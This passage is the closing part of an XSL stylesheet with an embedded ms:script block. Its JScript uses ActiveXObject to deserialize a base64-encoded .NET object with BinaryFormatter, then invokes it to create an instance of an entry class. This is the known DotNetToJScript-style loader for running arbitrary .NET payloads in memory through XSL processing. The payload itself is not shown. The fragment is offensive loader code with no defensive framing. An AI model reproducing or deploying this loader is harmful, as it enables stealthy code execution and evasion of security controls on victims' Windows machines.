			var stm = base64ToStream(serialized_obj);
			var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
			var al = new ActiveXObject('System.Collections.ArrayList');
			var d = fmt.Deserialize_2(stm);
			al.Add(undefined);
			var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
			
		} catch (e) {
		    debug(e.message);
		}
		]]>
	</ms:script>
</stylesheet>
